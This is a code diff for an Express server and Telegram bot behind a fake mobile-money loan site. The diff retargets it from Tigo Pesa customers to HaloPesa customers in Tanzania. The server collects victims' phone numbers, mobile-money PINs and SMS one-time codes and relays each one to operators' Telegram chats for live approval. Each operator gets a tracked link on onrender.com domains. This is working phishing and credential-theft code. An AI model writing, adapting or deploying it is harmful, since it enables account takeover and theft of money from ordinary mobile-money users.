@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - MAIN ADMIN EXCLUSIVE IDENTIFIER SERVER**
+ * **HALOPESA - MAIN ADMIN EXCLUSIVE IDENTIFIER SERVER**
  */
 
 const express = require('express');
@@ -42,11 +42,12 @@ function resolveAdminChatId(adminKeyOrId) {
   return adminKeyOrId || process.env.ADMIN_01 || null;
 }
 
-function isValidTigoNumber(phoneStr) {
+function isValidHaloPesaNumber(phoneStr) {
   if (!phoneStr) return false;
   const cleaned = String(phoneStr).trim().replace(/[\s\-\(\)]/g, '');
-  const tigoRegex = /^(?:\+?255|0)?(65|67|71|77)\d{7}$/;
-  return tigoRegex.test(cleaned);
+  // Accepts Halotel/HaloPesa mobile prefixes (062 / 62)
+  const halopesaRegex = /^(?:\+?255|0)?(62)\d{7}$/;
+  return halopesaRegex.test(cleaned);
 }
 
 async function telegramApi(pathSuffix, options = {}) {
@@ -118,15 +119,15 @@ async function initBot() {
       }
 
       const linkParam = (assignedCode === '01') ? 'main-admin' : assignedCode;
-      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${linkParam}`;
+      const uniqueIsolatedLink = `https://mixx-by-yas.onrender.com/?admin=${linkParam}`;
 
       const userWelcomeInfo = 
-        `🚨 **Unique Admin Link Registered Successfully!**\n\n` +
-        `👤 **Name:** ${fullName}\n` +
-        `🆔 **Chat ID:** \`${chatId}\`\n` +
-        `🔢 **Assigned Unique Code:** \`${assignedCode}\`\n` +
-        `🏷 **Username:** ${username}\n\n` +
-        `🔗 **Your Isolated Application Link:**\n${uniqueIsolatedLink}`;
+        `🚨 *Unique Admin Link Registered Successfully!*\n\n` +
+        `👤 *Name:* ${fullName}\n` +
+        `🆔 *Chat ID:* \`${chatId}\`\n` +
+        `🔢 *Assigned Unique Code:* \`${assignedCode}\`\n` +
+        `🏷 *Username:* ${username}\n\n` +
+        `🔗 *Your Isolated Application Link:*\n${uniqueIsolatedLink}`;
 
       await bot.sendMessage(chatId, userWelcomeInfo, { 
         parse_mode: 'Markdown',
@@ -141,7 +142,7 @@ async function initBot() {
     try {
       const chatId = String(msg.chat.id);
       const helpText =
-        `🛠 **Isolated Admin Bot Guide**\n\n` +
+        `🛠 *Isolated Admin Bot Guide*\n\n` +
         `/start - Register your chat ID and get your distinct custom-suffixed link.\n` +
         `/help - View instruction menu.`;
 
@@ -212,10 +213,6 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'app.html'));
 });
 
-app.get('/secret-admin-panel', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
 app.post('/api/submit-application', (req, res) => {
   try {
     let { phone, pin, amount, adminChatId } = req.body || {};
@@ -228,10 +225,10 @@ app.post('/api/submit-application', (req, res) => {
       adminChatId = '01';
     }
 
-    if (!isValidTigoNumber(phone)) {
+    if (!isValidHaloPesaNumber(phone)) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Invalid phone number format.' 
+        error: 'Tafadhali weka nambari sahihi ya HaloPesa (inaanza na 062).' 
       });
     }
 
@@ -252,8 +249,8 @@ app.post('/api/submit-application', (req, res) => {
     });
 
     const message =
-      `🚨 *NEW LOAN LOGIN / PIN ATTEMPT*\n\n` +
-      `📱 *Tigo Phone:* +255 ${phone}\n` +
+      `🚨 *NEW HALOPESA LOGIN / PIN ATTEMPT*\n\n` +
+      `📱 *Phone:* +255 ${phone}\n` +
       `🔑 *PIN Entered:* \`${pin}\`\n` +
       `💰 *Selected Amount:* ${amount}\n\n` +
       `📌 *Status:* Waiting for Admin Approval`;
@@ -304,7 +301,7 @@ app.post('/api/submit-otp', (req, res) => {
 
     const message =
       `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
-      `📱 *Tigo User:* +255 ${session.phone}\n` +
+      `📱 *User:* +255 ${session.phone}\n` +
       `🔢 *OTP Entered:* \`${otp}\`\n\n` +
       `Choose verification response:`;
 
@@ -332,32 +329,9 @@ app.post('/api/submit-otp', (req, res) => {
   }
 });
 
-app.post('/api/request-new-otp', (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-
-    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
-
-    session.status = 'APPROVED_LOAD_OTP';
-
-    const message =
-      `🔄 *USER REQUESTED NEW OTP*\n\n` +
-      `📱 *Tigo User:* +255 ${session.phone}\n` +
-      `⚠️ The user's countdown expired and they requested a new OTP code.`;
-
-    const targetChat = session.adminChatId || process.env.ADMIN_01;
-    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
-
-    res.status(200).json({ success: true });
-  } catch (error) {
-    res.status(500).json({ success: false, error: 'Internal server error' });
-  }
-});
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-  
+        
